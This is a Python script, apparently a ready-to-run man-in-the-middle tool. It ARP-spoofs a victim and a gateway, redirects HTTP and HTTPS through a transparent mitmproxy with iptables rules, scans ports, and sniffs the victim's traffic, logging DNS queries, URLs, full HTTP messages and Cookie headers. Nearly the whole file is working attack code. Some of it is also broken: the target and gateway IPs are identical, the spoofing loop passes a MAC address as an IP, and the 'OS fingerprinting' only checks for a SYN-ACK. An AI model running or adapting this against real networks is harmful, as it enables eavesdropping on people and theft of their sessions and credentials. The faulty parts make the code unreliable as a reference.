from scapy.all import ARP, Ether, IP, sendp, sniff, conf, srp, TCP, sr1, DNS, DNSQR
import time
import sys
import threading
import os
import subprocess
import datetime
import requests

conf.verb = 0

interface = "eth0"
gateway_ip = "192.168.127.12"
target_ip = "192.168.127.12"
attacker_mac = "00:11:22:33:44:55"
mitmproxy_port = 8080

def log_to_file(message):
    with open("traffic_log.txt", "a") as f:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"{timestamp} - {message}\n")

def spoof(target_ip, spoof_ip, target_mac):
    ether = Ether(dst=target_mac, src=attacker_mac)
    arp = ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac, hwsrc=attacker_mac)
    packet = ether / arp
    sendp(packet, iface=interface)
    msg = f"Spoofing: {target_ip} <- {spoof_ip}"
    print(msg)
    log_to_file(msg)

def restore(target_ip, spoof_ip, target_mac, spoof_mac):
    ether = Ether(dst=target_mac, src=attacker_mac)
    arp = ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac, hwsrc=spoof_mac)
    packet = ether / arp
    sendp(packet, count=4, iface=interface)
    msg = f"Restoring: {target_ip} <- {spoof_ip}"
    print(msg)
    log_to_file(msg)

def get_mac(ip):
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    result = srp(arp_request, timeout=2, iface=interface, verbose=False)[0]
    return result[0][1].hwsrc if result else None

def start_spoofing(target_mac, gateway_mac):
    try:
        while True:
            spoof(target_ip, gateway_mac, target_mac)
            spoof(gateway_ip, target_ip, gateway_mac)
            time.sleep(2)
    except Exception as e:
        msg = f"Spoofing error: {e}"
        print(msg)
        log_to_file(msg)

def start_mitmproxy():
    msg = f"mitmproxy {mitmproxy_port} started"
    print(msg)
    log_to_file(msg)
    mitmproxy_process = subprocess.Popen(["mitmproxy", "--mode", "transparent", "--listen-port", str(mitmproxy_port)])
    time.sleep(2)
    return mitmproxy_process

def setup_iptables():
    msg = f"Iptables setup"
    print(msg)
    log_to_file(msg)
    os.system(f"sysctl -w net.ipv4.ip_forward=1")
    os.system(f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 80 -j REDIRECT --to-port {mitmproxy_port}")
    os.system(f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 443 -j REDIRECT --to-port {mitmproxy_port}")

def cleanup():
    msg = f"Cleanup"
    print(msg)
    log_to_file(msg)
    os.system(f"iptables -t nat -D PREROUTING -i {interface} -p tcp --dport 80 -j REDIRECT --to-port {mitmproxy_port}")
    os.system(f"iptables -t nat -D PREROUTING -i {interface} -p tcp --dport 443 -j REDIRECT --to-port {mitmproxy_port}")
    os.system(f"sysctl -w net.ipv4.ip_forward=0")

def os_fingerprint(target_ip):
    msg = f"OS fingerprinting {target_ip}"
    print(msg)
    log_to_file(msg)
    ip = IP(dst=target_ip)
    tcp = TCP(dport=80, flags="S")
    packet = ip / tcp
    response = sr1(packet, timeout=2, verbose=False)
    if response:
        if response.haslayer(TCP):
            if response[TCP].flags == 18:
                msg = f"OS fingerprinting successful: {target_ip} is online"
                print(msg)
                log_to_file(msg)
            else:
                msg = f"OS fingerprinting failed: {target_ip} is offline"
                print(msg)
                log_to_file(msg)
        else:
            msg = f"OS fingerprinting failed: {target_ip} is offline"
            print(msg)
            log_to_file(msg)
    else:
        msg = f"OS fingerprinting failed: {target_ip} is offline"
        print(msg)
        log_to_file(msg)

def scan_ports(target_ip, port_range=(1, 1000)):
    msg = f"Scanning ports for {target_ip}"
    print(msg)
    log_to_file(msg)
    open_ports = []
    for port in range(port_range[0], port_range[1] + 1):
        pkt = IP(dst=target_ip) / TCP(dport=port, flags="S")
        response = sr1(pkt, timeout=2, verbose=False)
        if response and response.haslayer(TCP):
            if response[TCP].flags == 18:
                open_ports.append(port)
                msg = f"Port {port} is open"
                print(msg)
                log_to_file(msg)
            else:
                msg = f"Port {port} is closed"
                print(msg)
                log_to_file(msg)
        else:
            msg = f"Port {port} is filtered"
            print(msg)
            log_to_file(msg)
    return open_ports

def sniff_dns():
    msg = "DNS queries detected..."
    print(msg)
    log_to_file(msg)

    def process_dns(packet):
        if packet.haslayer(DNS) and packet[DNS].qr == 0:  # Query
            dns_query = packet[DNSQR].qname.decode("utf-8", errors="ignore")
            msg = f"DNS query: {dns_query}"
            print(msg)
            log_to_file(msg)

    sniff(iface=interface, filter=f"udp port 53 and host {target_ip}", prn=process_dns, store=0)

def sniff_traffic():
    msg = "Traffic sniffing started..."
    print(msg)
    log_to_file(msg)

    def process_packet(packet):
        summary = packet.summary()
        print(summary)
        log_to_file(summary)

        if packet.haslayer("IP"):
            src_ip = packet["IP"].src
            dst_ip = packet["IP"].dst
            if packet.haslayer("TCP"):
                src_port = packet["TCP"].sport
                dst_port = packet["TCP"].dport
                msg = f"Ports: {src_ip}:{src_port} -> {dst_ip}:{dst_port}"
                print(msg)
                log_to_file(msg)

                if packet.haslayer("Raw"):
                    payload = packet["Raw"].load
                    try:
                        decoded = payload.decode("utf-8", errors="ignore")
                        if "HTTP" in decoded:
                            lines = decoded.split("\r\n")
                            url = None
                            headers = {}
                            for line in lines:
                                if line.startswith("GET") or line.startswith("POST"):
                                    parts = line.split(" ")
                                    if len(parts) > 1:
                                        url = parts[1]  # URL parsing
                                elif ": " in line:
                                    key, value = line.split(": ", 1)
                                    headers[key] = value

                            if url:
                                msg = f"URL: {url}"
                                print(msg)
                                log_to_file(msg)

                            if headers:
                                for key, value in headers.items():
                                    if key in ["Host", "User-Agent", "Cookie", "Referer", "Content-Type"]:
                                        msg = f"{key}: {value}"
                                        print(msg)
                                        log_to_file(msg)

                            msg = f"HTTP message: {decoded}"
                            print(msg)
                            log_to_file(msg)

                        else:
                            msg = f"Encrypted or other data: {payload.hex()}"
                            print(msg)
                            log_to_file(msg)

                    except Exception as e:
                        msg = f"Decoding error: {payload.hex()} - {e}"
                        print(msg)
                        log_to_file(msg)

    sniff(iface=interface, filter=f"host {target_ip}", prn=process_packet, store=0)

def get_vendor(mac):
    url = f"https://api.macvendors.com/{mac}"
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            return response.text
        else:
            return "Vendor not found"
    except Exception:
        return "Internet connection error"

def main():
    try:
        # Get MAC addresses
        target_mac = get_mac(target_ip)
        gateway_mac = get_mac(gateway_ip)

        if not target_mac or not gateway_mac:
            msg = "Failed to retrieve MAC addresses! Please check the IP addresses."
            print(msg)
            log_to_file(msg)
            sys.exit(1)

        # Log MAC addresses
        msg = f"Target MAC: {target_mac}"
        print(msg)
        log_to_file(msg)
        msg = f"Gateway MAC: {gateway_mac}"
        print(msg)
        log_to_file(msg)

        # Get vendor information
        vendor = get_vendor(target_mac)
        msg = f"Device manufacturer: {vendor}"
        print(msg)
        log_to_file(msg)

        # Perform OS fingerprinting
        os_fingerprint(target_ip)

        # Scan open ports
        open_ports = scan_ports(target_ip, (1, 100))  # Scan ports 1-100
        msg = f"Open ports: {open_ports}"
        print(msg)
        log_to_file(msg)

        # Start MITM proxy
        mitmproxy_process = start_mitmproxy()

        # Set up iptables
        setup_iptables()

        # Start ARP spoofing
        spoof_thread = threading.Thread(target=start_spoofing, args=(target_mac, gateway_mac))
        spoof_thread.daemon = True
        spoof_thread.start()

        # Start DNS sniffing
        dns_sniff_thread = threading.Thread(target=sniff_dns)
        dns_sniff_thread.daemon = True
        dns_sniff_thread.start()

        # Start traffic sniffing
        traffic_sniff_thread = threading.Thread(target=sniff_traffic)
        traffic_sniff_thread.daemon = True
        traffic_sniff_thread.start()

        # Keep the script running
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            pass

        # Cleanup
        cleanup()

        # Terminate MITM proxy
        mitmproxy_process.terminate()

        # Restore ARP tables
        restore(target_ip, gateway_ip, target_mac, gateway_mac)
        restore(gateway_ip, target_ip, gateway_mac, target_mac)
        msg = "Traffic restored!"
        print(msg)
        log_to_file(msg)

    except Exception as e:
        msg = f"An error occurred: {e}"
        print(msg)
        log_to_file(msg)

if __name__ == "__main__":
    main()